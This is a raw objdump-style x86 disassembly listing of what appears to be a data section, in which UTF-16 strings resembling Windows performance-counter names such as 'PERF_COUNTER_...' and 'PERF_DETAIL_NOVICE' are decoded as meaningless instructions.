  4016db:	add    BYTE PTR [eax+eax*1+0x45],dl
  4016df:	add    BYTE PTR [eax],al
  4016e1:	add    BYTE PTR [eax],al
  4016e3:	add    BYTE PTR [ebp+0x0],ch
  4016e6:	jne    0x4016e8
  4016e8:	ins    BYTE PTR es:[edi],dx
  4016e9:	add    BYTE PTR [eax+eax*1+0x69],dh
  4016ed:	add    BYTE PTR [eax+0x0],dh
  4016f0:	ins    BYTE PTR es:[edi],dx
  4016f1:	add    BYTE PTR [ebp+0x0],ah
  4016f4:	inc    ecx
  4016f5:	add    BYTE PTR [edi+0x0],ah
  4016f8:	add    BYTE PTR [bp+si+0x0],dh
  4016fc:	add    BYTE PTR gs:[edi+0x0],ah
  401700:	popa   
  401701:	add    BYTE PTR [eax+eax*1+0x65],dh
  401705:	add    BYTE PTR [eax],al
  401707:	add    BYTE PTR [eax+0x0],dl
  40170a:	inc    ebp
  40170b:	add    BYTE PTR [edx+0x0],dl
  40170e:	inc    esi
  40170f:	add    BYTE PTR [edi+0x0],bl
  401712:	inc    ebx
  401713:	add    BYTE PTR [edi+0x0],cl
  401716:	push   ebp
  401717:	add    BYTE PTR [esi+0x0],cl
  40171a:	push   esp
  40171b:	add    BYTE PTR [ebp+0x0],al
  40171e:	push   edx
  40171f:	add    BYTE PTR [ebx+0x0],dl
  401722:	inc    ebp
  401723:	add    BYTE PTR [eax+eax*1+0x5f],dl
  401727:	add    BYTE PTR [ebp+0x0],cl
  40172a:	push   ebp
  40172b:	add    BYTE PTR [eax+eax*1+0x54],cl
  40172f:	add    BYTE PTR [ecx+0x0],cl
  401732:	pop    edi
  401733:	add    BYTE PTR [ecx+0x0],al
  401736:	inc    edi
  401737:	add    BYTE PTR [edi+0x0],al
  40173a:	push   edx
  40173b:	add    BYTE PTR [ebp+0x0],al
  40173e:	inc    edi
  40173f:	add    BYTE PTR [ecx+0x0],al
  401742:	push   esp
  401743:	add    BYTE PTR [ebp+0x0],al
  401746:	add    BYTE PTR [eax],al
  401748:	imul   eax,DWORD PTR [eax],0x73006e
  40174e:	je     0x401750
  401750:	popa   
  401751:	add    BYTE PTR [esi+0x0],ch
  401754:	arpl   WORD PTR [eax],ax
  401756:	add    BYTE PTR gs:[ecx+0x0],al
  40175a:	add    BYTE PTR [bx+0x0],ah
  40175e:	jb     0x401760
  401760:	add    BYTE PTR gs:[edi+0x0],ah
  401764:	popa   
  401765:	add    BYTE PTR [eax+eax*1+0x65],dh
  401769:	add    BYTE PTR [eax],al
  40176b:	add    BYTE PTR [eax],al
  40176d:	add    BYTE PTR [eax],al
  40176f:	add    BYTE PTR [eax+0x0],dl
  401772:	inc    ebp
  401773:	add    BYTE PTR [edx+0x0],dl
  401776:	inc    esi
  401777:	add    BYTE PTR [edi+0x0],bl
  40177a:	inc    ebx
  40177b:	add    BYTE PTR [edi+0x0],cl
  40177e:	push   ebp
  40177f:	add    BYTE PTR [esi+0x0],cl
  401782:	push   esp
  401783:	add    BYTE PTR [ebp+0x0],al
  401786:	push   edx
  401787:	add    BYTE PTR [ebx+0x0],dl
  40178a:	inc    ebp
  40178b:	add    BYTE PTR [eax+eax*1+0x5f],dl
  40178f:	add    BYTE PTR [ecx+0x0],cl
  401792:	dec    esi
  401793:	add    BYTE PTR [ebx+0x0],dl
  401796:	push   esp
  401797:	add    BYTE PTR [ecx+0x0],al
  40179a:	dec    esi
  40179b:	add    BYTE PTR [ebx+0x0],al
  40179e:	inc    ebp
  40179f:	add    BYTE PTR [edi+0x0],bl
  4017a2:	inc    ecx
  4017a3:	add    BYTE PTR [edi+0x0],al
  4017a6:	inc    edi
  4017a7:	add    BYTE PTR [edx+0x0],dl
  4017aa:	inc    ebp
  4017ab:	add    BYTE PTR [edi+0x0],al
  4017ae:	inc    ecx
  4017af:	add    BYTE PTR [eax+eax*1+0x45],dl
  4017b3:	add    BYTE PTR [eax],al
  4017b5:	add    BYTE PTR [eax],al
  4017b7:	add    BYTE PTR [edi+0x0],ah
  4017ba:	ins    BYTE PTR es:[edi],dx
  4017bb:	add    BYTE PTR [edi+0x0],ch
  4017be:	bound  eax,QWORD PTR [eax]
  4017c0:	popa   
  4017c1:	add    BYTE PTR [eax+eax*1+0x41],ch
  4017c5:	add    BYTE PTR [edi+0x0],ah
  4017c8:	add    BYTE PTR [bp+si+0x0],dh
  4017cc:	add    BYTE PTR gs:[edi+0x0],ah
  4017d0:	popa   
  4017d1:	add    BYTE PTR [eax+eax*1+0x65],dh
  4017d5:	add    BYTE PTR [eax+0x0],cl
  4017d8:	imul   eax,DWORD PTR [eax],0x740073
  4017de:	outs   dx,DWORD PTR ds:[esi]
  4017df:	add    BYTE PTR [edx+0x0],dh
  4017e2:	jns    0x4017e4
  4017e4:	add    BYTE PTR [eax],al
  4017e6:	add    BYTE PTR [eax],al
  4017e8:	push   eax
  4017e9:	add    BYTE PTR [ebp+0x0],al
  4017ec:	push   edx
  4017ed:	add    BYTE PTR [esi+0x0],al
  4017f0:	pop    edi
  4017f1:	add    BYTE PTR [ebx+0x0],al
  4017f4:	dec    edi
  4017f5:	add    BYTE PTR [ebp+0x0],dl
  4017f8:	dec    esi
  4017f9:	add    BYTE PTR [eax+eax*1+0x45],dl
  4017fd:	add    BYTE PTR [edx+0x0],dl
  401800:	push   ebx
  401801:	add    BYTE PTR [ebp+0x0],al
  401804:	push   esp
  401805:	add    BYTE PTR [edi+0x0],bl
  401808:	push   ebx
  401809:	add    BYTE PTR [ecx+0x0],cl
  40180c:	dec    esi
  40180d:	add    BYTE PTR [edi+0x0],al
  401810:	dec    esp
  401811:	add    BYTE PTR [ebp+0x0],al
  401814:	pop    edi
  401815:	add    BYTE PTR [ecx+0x0],al
  401818:	inc    edi
  401819:	add    BYTE PTR [edi+0x0],al
  40181c:	push   edx
  40181d:	add    BYTE PTR [ebp+0x0],al
  401820:	inc    edi
  401821:	add    BYTE PTR [ecx+0x0],al
  401824:	push   esp
  401825:	add    BYTE PTR [ebp+0x0],al
  401828:	pop    edi
  401829:	add    BYTE PTR [eax+0x0],cl
  40182c:	dec    ecx
  40182d:	add    BYTE PTR [ebx+0x0],dl
  401830:	push   esp
  401831:	add    BYTE PTR [edi+0x0],cl
  401834:	push   edx
  401835:	add    BYTE PTR [ecx+0x0],bl
  401838:	add    BYTE PTR [eax],al
  40183a:	add    BYTE PTR [eax],al
  40183c:	jae    0x40183e
  40183e:	je     0x401840
  401840:	popa   
  401841:	add    BYTE PTR [esi+0x0],ch
  401844:	add    BYTE PTR fs:[ecx+0x0],ah
  401848:	jb     0x40184a
  40184a:	add    BYTE PTR fs:[eax],al
  40184d:	add    BYTE PTR [eax],al
  40184f:	add    BYTE PTR [eax+0x0],dl
  401852:	inc    ebp
  401853:	add    BYTE PTR [edx+0x0],dl
  401856:	inc    esi
  401857:	add    BYTE PTR [edi+0x0],bl
  40185a:	inc    esp
  40185b:	add    BYTE PTR [ebp+0x0],al
  40185e:	push   esp
  40185f:	add    BYTE PTR [ecx+0x0],al
  401862:	dec    ecx
  401863:	add    BYTE PTR [eax+eax*1+0x5f],cl
  401867:	add    BYTE PTR [esi+0x0],cl
  40186a:	dec    edi
  40186b:	add    BYTE PTR [esi+0x0],dl
  40186e:	dec    ecx
  40186f:	add    BYTE PTR [ebx+0x0],al
  401872:	inc    ebp
  401873:	add    BYTE PTR [eax],al
  401875:	add    BYTE PTR [eax],al
  401877:	add    BYTE PTR [ecx+0x0],ah
  40187a:	add    BYTE PTR fs:[esi+0x0],dh
  40187e:	popa   
  40187f:	add    BYTE PTR [esi+0x0],ch
  401882:	arpl   WORD PTR [eax],ax
  401884:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  401889:	add    BYTE PTR [eax],al
  40188b:	add    BYTE PTR [eax+0x0],dl
  40188e:	inc    ebp
  40188f:	add    BYTE PTR [edx+0x0],dl
  401892:	inc    esi
  401893:	add    BYTE PTR [edi+0x0],bl
  401896:	inc    esp
  401897:	add    BYTE PTR [ebp+0x0],al
  40189a:	push   esp
  40189b:	add    BYTE PTR [ecx+0x0],al
  40189e:	dec    ecx
  40189f:	add    BYTE PTR [eax+eax*1+0x5f],cl
  4018a3:	add    BYTE PTR [ecx+0x0],al
  4018a6:	inc    esp
  4018a7:	add    BYTE PTR [esi+0x0],dl
  4018aa:	inc    ecx
  4018ab:	add    BYTE PTR [esi+0x0],cl
  4018ae:	inc    ebx
  4018af:	add    BYTE PTR [ebp+0x0],al
  4018b2:	inc    esp
  4018b3:	add    BYTE PTR [eax],al
  4018b5:	add    BYTE PTR [eax],al
  4018b7:	add    BYTE PTR [ebx+0x0],dh
  4018ba:	jne    0x4018bc
  4018bc:	ins    DWORD PTR es:[edi],dx
  4018bd:	add    BYTE PTR [eax],al
  4018bf:	add    BYTE PTR [eax+0x0],dl
  4018c2:	inc    ebp
  4018c3:	add    BYTE PTR [edx+0x0],dl
  4018c6:	inc    esi
  4018c7:	add    BYTE PTR [edi+0x0],bl
  4018ca:	inc    ecx
  4018cb:	add    BYTE PTR [edi+0x0],al
  4018ce:	inc    edi
  4018cf:	add    BYTE PTR [edx+0x0],dl
  4018d2:	inc    ebp
  4018d3:	add    BYTE PTR [edi+0x0],al
  4018d6:	inc    ecx
  4018d7:	add    BYTE PTR [eax+eax*1+0x45],dl
  4018db:	add    BYTE PTR [edi+0x0],bl
  4018de:	push   esp
  4018df:	add    BYTE PTR [edi+0x0],cl
  4018e2:	push   esp
  4018e3:	add    BYTE PTR [ecx+0x0],al
  4018e6:	dec    esp
  4018e7:	add    BYTE PTR [eax],al
  4018e9:	add    BYTE PTR [eax],al
  4018eb:	add    BYTE PTR [ecx+0x0],ah
  4018ee:	jbe    0x4018f0
  4018f0:	add    BYTE PTR [bx+si],al
  4018f3:	add    BYTE PTR [eax+0x0],dl
  4018f6:	inc    ebp
  4018f7:	add    BYTE PTR [edx+0x0],dl
  4018fa:	inc    esi
  4018fb:	add    BYTE PTR [edi+0x0],bl
  4018fe:	inc    ecx
  4018ff:	add    BYTE PTR [edi+0x0],al
  401902:	inc    edi
  401903:	add    BYTE PTR [edx+0x0],dl
  401906:	inc    ebp
  401907:	add    BYTE PTR [edi+0x0],al
  40190a:	inc    ecx
  40190b:	add    BYTE PTR [eax+eax*1+0x45],dl
  40190f:	add    BYTE PTR [edi+0x0],bl
  401912:	inc    ecx
  401913:	add    BYTE PTR [esi+0x0],dl
  401916:	inc    edi
  401917:	add    BYTE PTR [eax],al
  401919:	add    BYTE PTR [eax],al
  40191b:	add    BYTE PTR [ebp+0x0],ch
  40191e:	popa   
  40191f:	add    BYTE PTR [eax+0x0],bh
  401922:	add    BYTE PTR [eax],al
  401924:	push   eax
  401925:	add    BYTE PTR [ebp+0x0],al
  401928:	push   edx
  401929:	add    BYTE PTR [esi+0x0],al
  40192c:	pop    edi
  40192d:	add    BYTE PTR [ecx+0x0],al
  401930:	inc    edi
  401931:	add    BYTE PTR [edi+0x0],al
  401934:	push   edx
  401935:	add    BYTE PTR [ebp+0x0],al
  401938:	inc    edi
  401939:	add    BYTE PTR [ecx+0x0],al
  40193c:	push   esp
  40193d:	add    BYTE PTR [ebp+0x0],al
  401940:	pop    edi
  401941:	add    BYTE PTR [ebp+0x0],cl
  401944:	inc    ecx
  401945:	add    BYTE PTR [eax+0x0],bl
  401948:	add    BYTE PTR [eax],al
  40194a:	add    BYTE PTR [eax],al
  40194c:	ins    DWORD PTR es:[edi],dx
  40194d:	add    BYTE PTR [ecx+0x0],ch
  401950:	outs   dx,BYTE PTR ds:[esi]
  401951:	add    BYTE PTR [eax],al
  401953:	add    BYTE PTR [eax+0x0],dl
  401956:	inc    ebp
  401957:	add    BYTE PTR [edx+0x0],dl
  40195a:	inc    esi
  40195b:	add    BYTE PTR [edi+0x0],bl
  40195e:	inc    ecx
  40195f:	add    BYTE PTR [edi+0x0],al
  401962:	inc    edi
  401963:	add    BYTE PTR [edx+0x0],dl
  401966:	inc    ebp
  401967:	add    BYTE PTR [edi+0x0],al
  40196a:	inc    ecx
  40196b:	add    BYTE PTR [eax+eax*1+0x45],dl
  40196f:	add    BYTE PTR [edi+0x0],bl
  401972:	dec    ebp
  401973:	add    BYTE PTR [ecx+0x0],cl
  401976:	dec    esi
  401977:	add    BYTE PTR [eax],al
  401979:	add    BYTE PTR [eax],al
  40197b:	add    BYTE PTR [ebp+0x0],dh
  40197e:	outs   dx,BYTE PTR ds:[esi]
  40197f:	add    BYTE PTR [eax+eax*1+0x65],ah
  401983:	add    BYTE PTR [esi+0x0],ah
  401986:	imul   eax,DWORD PTR [eax],0x65006e
  40198c:	add    BYTE PTR fs:[eax],al
  40198f:	add    BYTE PTR [eax+0x0],dl
  401992:	inc    ebp
  401993:	add    BYTE PTR [edx+0x0],dl
  401996:	inc    esi
  401997:	add    BYTE PTR [edi+0x0],bl
  40199a:	inc    ecx
  40199b:	add    BYTE PTR [edi+0x0],al
  40199e:	inc    edi
  40199f:	add    BYTE PTR [edx+0x0],dl
  4019a2:	inc    ebp
  4019a3:	add    BYTE PTR [edi+0x0],al
  4019a6:	inc    ecx
  4019a7:	add    BYTE PTR [eax+eax*1+0x45],dl
  4019ab:	add    BYTE PTR [edi+0x0],bl
  4019ae:	push   ebp
  4019af:	add    BYTE PTR [esi+0x0],cl
  4019b2:	inc    esp
  4019b3:	add    BYTE PTR [ebp+0x0],al
  4019b6:	inc    esi
  4019b7:	add    BYTE PTR [ecx+0x0],cl
  4019ba:	dec    esi
  4019bb:	add    BYTE PTR [ebp+0x0],al
  4019be:	inc    esp
  4019bf:	add    BYTE PTR [eax],al
  4019c1:	add    BYTE PTR [eax],al
  4019c3:	add    BYTE PTR [edx+0x0],dh
  4019c6:	add    BYTE PTR gs:[esi+0x0],ah
  4019ca:	add    BYTE PTR gs:[edx+0x0],dh
  4019ce:	add    BYTE PTR gs:[esi+0x0],ch
  4019d2:	arpl   WORD PTR [eax],ax
  4019d4:	add    BYTE PTR gs:[eax],al
  4019d7:	add    BYTE PTR [eax+0x0],dl
  4019da:	inc    ebp
  4019db:	add    BYTE PTR [edx+0x0],dl
  4019de:	inc    esi
  4019df:	add    BYTE PTR [edi+0x0],bl
  4019e2:	inc    ecx
  4019e3:	add    BYTE PTR [eax+eax*1+0x54],dl
  4019e7:	add    BYTE PTR [edx+0x0],dl
  4019ea:	dec    ecx
  4019eb:	add    BYTE PTR [edx+0x0],al
  4019ee:	pop    edi
  4019ef:	add    BYTE PTR [edx+0x0],al
  4019f2:	pop    ecx
  4019f3:	add    BYTE PTR [edi+0x0],bl
  4019f6:	push   edx
  4019f7:	add    BYTE PTR [ebp+0x0],al
  4019fa:	inc    esi
  4019fb:	add    BYTE PTR [ebp+0x0],al
  4019fe:	push   edx
  4019ff:	add    BYTE PTR [ebp+0x0],al
  401a02:	dec    esi
  401a03:	add    BYTE PTR [ebx+0x0],al
  401a06:	inc    ebp
  401a07:	add    BYTE PTR [eax],al
  401a09:	add    BYTE PTR [eax],al
  401a0b:	add    BYTE PTR [esi+0x0],ch
  401a0e:	outs   dx,DWORD PTR ds:[esi]
  401a0f:	add    BYTE PTR [eax+eax*1+0x69],al
  401a13:	add    BYTE PTR [ebx+0x0],dh
  401a16:	jo     0x401a18
  401a18:	ins    BYTE PTR es:[edi],dx
  401a19:	add    BYTE PTR [ecx+0x0],ah
  401a1c:	jns    0x401a1e
  401a1e:	add    BYTE PTR [eax],al
  401a20:	push   eax
  401a21:	add    BYTE PTR [ebp+0x0],al
  401a24:	push   edx
  401a25:	add    BYTE PTR [esi+0x0],al
  401a28:	pop    edi
  401a29:	add    BYTE PTR [ecx+0x0],al
  401a2c:	push   esp
  401a2d:	add    BYTE PTR [eax+eax*1+0x52],dl
  401a31:	add    BYTE PTR [ecx+0x0],cl
  401a34:	inc    edx
  401a35:	add    BYTE PTR [edi+0x0],bl
  401a38:	dec    esi
  401a39:	add    BYTE PTR [edi+0x0],cl
  401a3c:	pop    edi
  401a3d:	add    BYTE PTR [eax+eax*1+0x49],al
  401a41:	add    BYTE PTR [ebx+0x0],dl
  401a44:	push   eax
  401a45:	add    BYTE PTR [eax+eax*1+0x41],cl
  401a49:	add    BYTE PTR [ecx+0x0],bl
  401a4c:	inc    ecx
  401a4d:	add    BYTE PTR [edx+0x0],al
  401a50:	dec    esp
  401a51:	add    BYTE PTR [ebp+0x0],al
  401a54:	add    BYTE PTR [eax],al
  401a56:	add    BYTE PTR [eax],al
  401a58:	outs   dx,BYTE PTR ds:[esi]
  401a59:	add    BYTE PTR [edi+0x0],ch
  401a5c:	inc    esp
  401a5d:	add    BYTE PTR [ecx+0x0],ch
  401a60:	add    BYTE PTR [bx+di+0x0],ch
  401a64:	je     0x401a66
  401a66:	inc    edi
  401a67:	add    BYTE PTR [edx+0x0],dh
  401a6a:	outs   dx,DWORD PTR ds:[esi]
  401a6b:	add    BYTE PTR [ebp+0x0],dh
  401a6e:	jo     0x401a70
  401a70:	imul   eax,DWORD PTR [eax],0x67006e
  401a76:	add    BYTE PTR [eax],al
  401a78:	push   eax
  401a79:	add    BYTE PTR [ebp+0x0],al
  401a7c:	push   edx
  401a7d:	add    BYTE PTR [esi+0x0],al
  401a80:	pop    edi
  401a81:	add    BYTE PTR [ecx+0x0],al
  401a84:	push   esp
  401a85:	add    BYTE PTR [eax+eax*1+0x52],dl
  401a89:	add    BYTE PTR [ecx+0x0],cl
  401a8c:	inc    edx
  401a8d:	add    BYTE PTR [edi+0x0],bl
  401a90:	dec    esi
  401a91:	add    BYTE PTR [edi+0x0],cl
  401a94:	pop    edi
  401a95:	add    BYTE PTR [edi+0x0],al
  401a98:	push   edx
  401a99:	add    BYTE PTR [edi+0x0],cl
  401a9c:	push   ebp
  401a9d:	add    BYTE PTR [eax+0x0],dl
  401aa0:	pop    edi
  401aa1:	add    BYTE PTR [ebx+0x0],dl
  401aa4:	inc    ebp
  401aa5:	add    BYTE PTR [eax+0x0],dl
  401aa8:	inc    ecx
  401aa9:	add    BYTE PTR [edx+0x0],dl
  401aac:	inc    ecx
  401aad:	add    BYTE PTR [eax+eax*1+0x4f],dl
  401ab1:	add    BYTE PTR [edx+0x0],dl
  401ab4:	add    BYTE PTR [eax],al
  401ab6:	add    BYTE PTR [eax],al
  401ab8:	add    BYTE PTR fs:[ecx+0x0],ch
  401abc:	jae    0x401abe
  401abe:	jo     0x401ac0
  401ac0:	ins    BYTE PTR es:[edi],dx
  401ac1:	add    BYTE PTR [ecx+0x0],ah
  401ac4:	jns    0x401ac6
  401ac6:	inc    ecx
  401ac7:	add    BYTE PTR [ebx+0x0],dh
  401aca:	dec    eax
  401acb:	add    BYTE PTR [ebp+0x0],ah
  401ace:	js     0x401ad0
  401ad0:	add    BYTE PTR [eax],al
  401ad2:	add    BYTE PTR [eax],al
  401ad4:	push   eax
  401ad5:	add    BYTE PTR [ebp+0x0],al
  401ad8:	push   edx
  401ad9:	add    BYTE PTR [esi+0x0],al
  401adc:	pop    edi
  401add:	add    BYTE PTR [ecx+0x0],al
  401ae0:	push   esp
  401ae1:	add    BYTE PTR [eax+eax*1+0x52],dl
  401ae5:	add    BYTE PTR [ecx+0x0],cl
  401ae8:	inc    edx
  401ae9:	add    BYTE PTR [edi+0x0],bl
  401aec:	inc    esp
  401aed:	add    BYTE PTR [ecx+0x0],cl
  401af0:	push   ebx
  401af1:	add    BYTE PTR [eax+0x0],dl
  401af4:	dec    esp
  401af5:	add    BYTE PTR [ecx+0x0],al
  401af8:	pop    ecx
  401af9:	add    BYTE PTR [edi+0x0],bl
  401afc:	inc    ecx
  401afd:	add    BYTE PTR [ebx+0x0],dl
  401b00:	pop    edi
  401b01:	add    BYTE PTR [eax+0x0],cl
  401b04:	inc    ebp
  401b05:	add    BYTE PTR [eax+0x0],bl
  401b08:	add    BYTE PTR [eax],al
  401b0a:	add    BYTE PTR [eax],al
  401b0c:	add    BYTE PTR fs:[ecx+0x0],ch
  401b10:	jae    0x401b12
  401b12:	jo     0x401b14
  401b14:	ins    BYTE PTR es:[edi],dx
  401b15:	add    BYTE PTR [ecx+0x0],ah
  401b18:	jns    0x401b1a
  401b1a:	inc    ecx
  401b1b:	add    BYTE PTR [ebx+0x0],dh
  401b1e:	push   edx
  401b1f:	add    BYTE PTR [ebp+0x0],ah
  401b22:	popa   
  401b23:	add    BYTE PTR [eax+eax*1+0x0],ch
  401b27:	add    BYTE PTR [eax+0x0],dl
  401b2a:	inc    ebp
  401b2b:	add    BYTE PTR [edx+0x0],dl
  401b2e:	inc    esi
  401b2f:	add    BYTE PTR [edi+0x0],bl
  401b32:	inc    ecx
  401b33:	add    BYTE PTR [eax+eax*1+0x54],dl
  401b37:	add    BYTE PTR [edx+0x0],dl
  401b3a:	dec    ecx
  401b3b:	add    BYTE PTR [edx+0x0],al
  401b3e:	pop    edi
  401b3f:	add    BYTE PTR [eax+eax*1+0x49],al
  401b43:	add    BYTE PTR [ebx+0x0],dl
  401b46:	push   eax
  401b47:	add    BYTE PTR [eax+eax*1+0x41],cl
  401b4b:	add    BYTE PTR [ecx+0x0],bl
  401b4e:	pop    edi
  401b4f:	add    BYTE PTR [ecx+0x0],al
  401b52:	push   ebx
  401b53:	add    BYTE PTR [edi+0x0],bl
  401b56:	push   edx
  401b57:	add    BYTE PTR [ebp+0x0],al
  401b5a:	inc    ecx
  401b5b:	add    BYTE PTR [eax+eax*1+0x0],cl
  401b5f:	add    BYTE PTR [eax+0x0],dh
  401b62:	add    BYTE PTR gs:[edx+0x0],dh
  401b66:	data16 add BYTE PTR [edi+0x0],bl
  401b6a:	arpl   WORD PTR [eax],ax
  401b6c:	outs   dx,DWORD PTR ds:[esi]
  401b6d:	add    BYTE PTR [ebp+0x0],dh
  401b70:	outs   dx,BYTE PTR ds:[esi]
  401b71:	add    BYTE PTR [eax+eax*1+0x65],dh
  401b75:	add    BYTE PTR [edx+0x0],dh
  401b78:	pop    edi
  401b79:	add    BYTE PTR [ebx+0x0],ah
  401b7c:	outs   dx,DWORD PTR ds:[esi]
  401b7d:	add    BYTE PTR [ebp+0x0],dh
  401b80:	outs   dx,BYTE PTR ds:[esi]
  401b81:	add    BYTE PTR [eax+eax*1+0x65],dh
  401b85:	add    BYTE PTR [edx+0x0],dh
  401b88:	add    BYTE PTR [eax],al
  401b8a:	add    BYTE PTR [eax],al
  401b8c:	push   eax
  401b8d:	add    BYTE PTR [ebp+0x0],al
  401b90:	push   edx
  401b91:	add    BYTE PTR [esi+0x0],al
  401b94:	pop    edi
  401b95:	add    BYTE PTR [ebx+0x0],al
  401b98:	dec    edi
  401b99:	add    BYTE PTR [ebp+0x0],dl
  401b9c:	dec    esi
  401b9d:	add    BYTE PTR [eax+eax*1+0x45],dl
  401ba1:	add    BYTE PTR [edx+0x0],dl
  401ba4:	pop    edi
  401ba5:	add    BYTE PTR [ebx+0x0],al
  401ba8:	dec    edi
  401ba9:	add    BYTE PTR [ebp+0x0],dl
  401bac:	dec    esi
  401bad:	add    BYTE PTR [eax+eax*1+0x45],dl
  401bb1:	add    BYTE PTR [edx+0x0],dl
  401bb4:	add    BYTE PTR [eax],al
  401bb6:	add    BYTE PTR [eax],al
  401bb8:	jo     0x401bba
  401bba:	add    BYTE PTR gs:[edx+0x0],dh
  401bbe:	data16 add BYTE PTR [edi+0x0],bl
  401bc2:	arpl   WORD PTR [eax],ax
  401bc4:	outs   dx,DWORD PTR ds:[esi]
  401bc5:	add    BYTE PTR [ebp+0x0],dh
  401bc8:	outs   dx,BYTE PTR ds:[esi]
  401bc9:	add    BYTE PTR [eax+eax*1+0x65],dh
  401bcd:	add    BYTE PTR [edx+0x0],dh
  401bd0:	pop    edi
  401bd1:	add    BYTE PTR [eax+eax*1+0x69],dh
  401bd5:	add    BYTE PTR [ebp+0x0],ch
  401bd8:	add    BYTE PTR gs:[edx+0x0],dh
  401bdc:	add    BYTE PTR [eax],al
  401bde:	add    BYTE PTR [eax],al
  401be0:	push   eax
  401be1:	add    BYTE PTR [ebp+0x0],al
  401be4:	push   edx
  401be5:	add    BYTE PTR [esi+0x0],al
  401be8:	pop    edi
  401be9:	add    BYTE PTR [ebx+0x0],al
  401bec:	dec    edi
  401bed:	add    BYTE PTR [ebp+0x0],dl
  401bf0:	dec    esi
  401bf1:	add    BYTE PTR [eax+eax*1+0x45],dl
  401bf5:	add    BYTE PTR [edx+0x0],dl
  401bf8:	pop    edi
  401bf9:	add    BYTE PTR [eax+eax*1+0x49],dl
  401bfd:	add    BYTE PTR [ebp+0x0],cl
  401c00:	inc    ebp
  401c01:	add    BYTE PTR [edx+0x0],dl
  401c04:	add    BYTE PTR [eax],al
  401c06:	add    BYTE PTR [eax],al
  401c08:	jo     0x401c0a
  401c0a:	add    BYTE PTR gs:[edx+0x0],dh
  401c0e:	data16 add BYTE PTR [edi+0x0],bl
  401c12:	arpl   WORD PTR [eax],ax
  401c14:	outs   dx,DWORD PTR ds:[esi]
  401c15:	add    BYTE PTR [ebp+0x0],dh
  401c18:	outs   dx,BYTE PTR ds:[esi]
  401c19:	add    BYTE PTR [eax+eax*1+0x65],dh
  401c1d:	add    BYTE PTR [edx+0x0],dh
  401c20:	pop    edi
  401c21:	add    BYTE PTR [ecx+0x0],dh
  401c24:	jne    0x401c26
  401c26:	add    BYTE PTR gs:[ebp+0x0],dh
  401c2a:	add    BYTE PTR gs:[eax+eax*1+0x65],ch
  401c2f:	add    BYTE PTR [esi+0x0],ch
  401c32:	pop    edi
  401c33:	add    BYTE PTR [eax+eax*1+0x79],dh
  401c37:	add    BYTE PTR [eax+0x0],dh
  401c3a:	add    BYTE PTR gs:[eax],al
  401c3d:	add    BYTE PTR [eax],al
  401c3f:	add    BYTE PTR [eax+0x0],dl
  401c42:	inc    ebp
  401c43:	add    BYTE PTR [edx+0x0],dl
  401c46:	inc    esi
  401c47:	add    BYTE PTR [edi+0x0],bl
  401c4a:	inc    ebx
  401c4b:	add    BYTE PTR [edi+0x0],cl
  401c4e:	push   ebp
  401c4f:	add    BYTE PTR [esi+0x0],cl
  401c52:	push   esp
  401c53:	add    BYTE PTR [ebp+0x0],al
  401c56:	push   edx
  401c57:	add    BYTE PTR [edi+0x0],bl
  401c5a:	push   ecx
  401c5b:	add    BYTE PTR [ebp+0x0],dl
  401c5e:	inc    ebp
  401c5f:	add    BYTE PTR [ebp+0x0],dl
  401c62:	inc    ebp
  401c63:	add    BYTE PTR [eax+eax*1+0x45],cl
  401c67:	add    BYTE PTR [esi+0x0],cl
  401c6a:	pop    edi
  401c6b:	add    BYTE PTR [eax+eax*1+0x59],dl
  401c6f:	add    BYTE PTR [eax+0x0],dl
  401c72:	inc    ebp
  401c73:	add    BYTE PTR [eax],al
  401c75:	add    BYTE PTR [eax],al
  401c77:	add    BYTE PTR [eax+0x0],dh
  401c7a:	add    BYTE PTR gs:[edx+0x0],dh
  401c7e:	data16 add BYTE PTR [edi+0x0],bl
  401c82:	arpl   WORD PTR [eax],ax
  401c84:	outs   dx,DWORD PTR ds:[esi]
  401c85:	add    BYTE PTR [ebp+0x0],dh
  401c88:	outs   dx,BYTE PTR ds:[esi]
  401c89:	add    BYTE PTR [eax+eax*1+0x65],dh
  401c8d:	add    BYTE PTR [edx+0x0],dh
  401c90:	pop    edi
  401c91:	add    BYTE PTR [eax+eax*1+0x61],ch
  401c95:	add    BYTE PTR [edx+0x0],dh
  401c98:	add    BYTE PTR [di+0x0],ah
  401c9c:	pop    edi
  401c9d:	add    BYTE PTR [ecx+0x0],dh
  401ca0:	jne    0x401ca2
  401ca2:	add    BYTE PTR gs:[ebp+0x0],dh
  401ca6:	add    BYTE PTR gs:[eax+eax*1+0x65],ch
  401cab:	add    BYTE PTR [esi+0x0],ch
  401cae:	pop    edi
  401caf:	add    BYTE PTR [eax+eax*1+0x79],dh
  401cb3:	add    BYTE PTR [eax+0x0],dh
  401cb6:	add    BYTE PTR gs:[eax],al
  401cb9:	add    BYTE PTR [eax],al
  401cbb:	add    BYTE PTR [eax],al
  401cbd:	add    BYTE PTR [eax],al
  401cbf:	add    BYTE PTR [eax+0x0],dl
  401cc2:	inc    ebp
  401cc3:	add    BYTE PTR [edx+0x0],dl
  401cc6:	inc    esi
  401cc7:	add    BYTE PTR [edi+0x0],bl
  401cca:	inc    ebx
  401ccb:	add    BYTE PTR [edi+0x0],cl
  401cce:	push   ebp
  401ccf:	add    BYTE PTR [esi+0x0],cl
  401cd2:	push   esp
  401cd3:	add    BYTE PTR [ebp+0x0],al
  401cd6:	push   edx
  401cd7:	add    BYTE PTR [edi+0x0],bl
  401cda:	dec    esp
  401cdb:	add    BYTE PTR [ecx+0x0],al
  401cde:	push   edx
  401cdf:	add    BYTE PTR [edi+0x0],al
  401ce2:	inc    ebp
  401ce3:	add    BYTE PTR [edi+0x0],bl
  401ce6:	push   ecx
  401ce7:	add    BYTE PTR [ebp+0x0],dl
  401cea:	inc    ebp
  401ceb:	add    BYTE PTR [ebp+0x0],dl
  401cee:	inc    ebp
  401cef:	add    BYTE PTR [eax+eax*1+0x45],cl
  401cf3:	add    BYTE PTR [esi+0x0],cl
  401cf6:	pop    edi
  401cf7:	add    BYTE PTR [eax+eax*1+0x59],dl
  401cfb:	add    BYTE PTR [eax+0x0],dl
  401cfe:	inc    ebp
	...
  401d07:	add    BYTE PTR [eax+0x0],dh
  401d0a:	add    BYTE PTR gs:[edx+0x0],dh
  401d0e:	data16 add BYTE PTR [edi+0x0],bl
  401d12:	arpl   WORD PTR [eax],ax
  401d14:	outs   dx,DWORD PTR ds:[esi]
  401d15:	add    BYTE PTR [ebp+0x0],dh
  401d18:	outs   dx,BYTE PTR ds:[esi]
  401d19:	add    BYTE PTR [eax+eax*1+0x65],dh
  401d1d:	add    BYTE PTR [edx+0x0],dh
  401d20:	pop    edi
